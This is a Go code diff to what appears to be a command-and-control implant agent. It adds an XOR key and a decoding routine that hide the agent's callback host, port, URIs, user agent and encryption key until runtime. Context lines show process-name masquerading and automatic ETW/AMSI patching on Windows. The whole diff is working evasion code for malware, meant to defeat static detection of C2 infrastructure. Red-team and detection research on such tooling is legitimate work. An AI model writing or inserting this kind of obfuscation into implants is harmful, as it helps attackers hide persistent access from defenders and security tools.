@@ -59,6 +59,7 @@ var (
 	masqueradeName    string = ""     // Process name masquerade (Linux: prctl PR_SET_NAME)
 	customHeaders     string = ""     // Base64-encoded JSON of additional HTTP headers
 	autoPatch         string = ""     // Auto-patch ETW and AMSI at startup (Windows only)
+	xorKey            string = ""     // Base64 XOR key for C2 string deobfuscation (empty = plaintext)
 )
 
 func main() {
@@ -66,6 +67,23 @@ func main() {
 }
 
 func runAgent() {
+	// Deobfuscate C2 config strings if XOR key is present
+	if xorKey != "" {
+		keyBytes, err := base64.StdEncoding.DecodeString(xorKey)
+		if err == nil && len(keyBytes) > 0 {
+			payloadUUID = xorDecodeString(payloadUUID, keyBytes)
+			callbackHost = xorDecodeString(callbackHost, keyBytes)
+			callbackPort = xorDecodeString(callbackPort, keyBytes)
+			userAgent = xorDecodeString(userAgent, keyBytes)
+			encryptionKey = xorDecodeString(encryptionKey, keyBytes)
+			getURI = xorDecodeString(getURI, keyBytes)
+			postURI = xorDecodeString(postURI, keyBytes)
+			hostHeader = xorDecodeString(hostHeader, keyBytes)
+			proxyURL = xorDecodeString(proxyURL, keyBytes)
+			customHeaders = xorDecodeString(customHeaders, keyBytes)
+		}
+	}
+
 	// Convert string build variables to appropriate types with validation
 	callbackPortInt, err := strconv.Atoi(callbackPort)
 	if err != nil {
@@ -617,4 +635,21 @@ func regexMatch(pattern, value string) bool {
 		return false
 	}
 	return re.MatchString(value)
+}
+
+// xorDecodeString decodes a base64-encoded XOR-encrypted string.
+// If the input is empty or decoding fails, returns the original string.
+func xorDecodeString(encoded string, key []byte) string {
+	if encoded == "" || len(key) == 0 {
+		return encoded
+	}
+	data, err := base64.StdEncoding.DecodeString(encoded)
+	if err != nil {
+		return encoded // not encoded, use as-is
+	}
+	result := make([]byte, len(data))
+	for i, b := range data {
+		result[i] = b ^ key[i%len(key)]
+	}
+	return string(result)
 }
